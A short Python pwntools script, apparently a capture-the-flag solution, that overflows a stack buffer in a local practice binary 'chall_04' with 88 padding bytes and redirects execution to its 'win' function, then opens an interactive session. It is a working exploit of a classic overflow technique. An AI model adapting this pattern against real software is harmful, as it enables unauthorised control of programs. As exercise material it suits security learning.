# coding: utf-8
from pwn import *
elf = ELF("./chall_04")
winad = elf.sym["win"]
payload = b"A"*88 + p64(winad)
p=process("./chall_04")
p.recv()
p.sendline(payload)
p.interactive()
